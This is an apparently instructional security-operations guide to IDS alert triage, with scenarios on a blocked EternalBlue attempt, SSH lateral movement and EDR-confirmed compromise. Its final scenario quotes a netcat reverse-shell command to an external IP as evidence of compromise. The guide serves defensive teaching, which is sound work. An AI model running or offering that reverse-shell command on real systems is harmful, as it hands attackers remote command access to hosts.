Receiving security alerts is straightforward; the core challenge is triaging and analyzing them efficiently. A systematic triage workflow allows analysts to quickly separate normal background noise from high-confidence, actionable intrusions.

---
## 1. Core Alert Triage Workflow

Every IDS alert should be processed through a repeatable 5-step workflow:

1. **Read the Alert Details**: Extract the signature rule name, source/destination IPs, ports, and protocols.

2. **Assess Context**: Analyze the direction of traffic (e.g. internal to external) and the criticality of the targeted asset (e.g., Domain Controller vs. guest VLAN workstation).

3. **Check Corollary Indicators**: Look for related alerts from the same source IP, check firewall action blocks, and query EDR or host logs.

4. **Make a Determination**: Classify the event (True Positive, False Positive, or Informational).

5. **Take Action**: If verified, isolate hosts, drop attacking IPs at the firewall, and escalate to response teams.

---
## 2. Triage Scenarios & Classifications

Consider a situation where you receive a **Priority 1 (Critical)** IDS alert: `"ET EXPLOIT SMB EternalBlue MS17-010"` originating from external IP `203.0.113.42` targeting your internal Domain Controller at `10.0.1.5`. Upon checking the firewall logs, you confirm the connection was blocked.

[!IMPORTANT] The triage determination for this alert is **True Positive but contained -- the attack was real but the firewall prevented exploitation; still investigate whether the DC was accessed via other means**. While the threat was blocked at the perimeter, you must verify if the attacker attempted other vectors of entry or lateral propagation.

---
## 3. Correlating Multiple Events (Lateral Movement)

Never view an alert in complete isolation. Multiple low-severity events can aggregate into a high-priority incident when correlated.

Suppose three alerts trigger within a 5-minute window:

1. **Port Scan** from internal host `10.0.5.23` scanning 15 ports on `10.0.1.5`.

2. **SSH Brute Force** from `10.0.5.23` to `10.0.1.5` (200 failed attempts).

3. **Successful SSH Login** from `10.0.5.23` to `10.0.1.5`.

[!WARNING] This correlation tells you that **a host (10.0.5.23) has been compromised and is actively performing reconnaissance, brute force, and gaining access -- this is lateral movement in progress**. This indicates an attacker has already bypassed your perimeter and is attempting to escalate control inside your domain.

---
## 4. EDR Integration: Confirming a Compromise

Host-level EDR logs provide final validation on whether a network alert resulted in a successful breach.

For example, an IDS rule fires for `"ET POLICY Outgoing FTP Connection on Non-Standard Port"` from `10.0.5.23` to `185.220.101.42:4444`. You query the endpoint's EDR console and find that `explorer.exe` spawned `cmd.exe`, which subsequently launched `nc.exe -e cmd.exe 185.220.101.42 4444`.

[!CAUTION] This represents **a confirmed compromise with an active reverse shell -- Netcat is providing remote command access to the attacker on port 4444**. The process execution tree confirms the attacker succeeded in executing arbitrary code and has established an interactive console terminal back to their command server. The host must be isolated immediately.
